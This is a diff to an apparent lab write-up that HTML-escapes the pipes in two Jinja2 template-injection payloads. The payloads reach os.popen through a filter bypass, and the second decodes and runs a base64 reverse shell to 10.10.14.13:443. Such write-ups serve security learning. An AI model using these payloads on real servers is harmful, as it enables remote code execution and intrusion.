@@ -270,7 +270,7 @@ Payload:
 
 
 ```jinja2
-&#123;&#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;id&#39;)|attr(&#39;read&#39;)()&#125;&#125;
+&#123;&#123;request&#124;attr(&#39;application&#39;)&#124;attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)&#124;attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)&#124;attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)&#124;attr(&#39;popen&#39;)(&#39;id&#39;)&#124;attr(&#39;read&#39;)()&#125;&#125;
 ```
 
 <br />
@@ -298,7 +298,7 @@ Final Payload:
 
 
 ```jinja2
-&#123;&#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;echo+YmFzaCAtYyAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzICAwPiYxIgo=|base64+-d|bash&#39;)|attr(&#39;read&#39;)()&#125;&#125;
+&#123;&#123;request&#124;attr(&#39;application&#39;)&#124;attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)&#124;attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)&#124;attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)&#124;attr(&#39;popen&#39;)(&#39;echo+YmFzaCAtYyAgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTMvNDQzICAwPiYxIgo=&#124;base64+-d&#124;bash&#39;)&#124;attr(&#39;read&#39;)()&#125;&#125;
 ```
 
 <br />
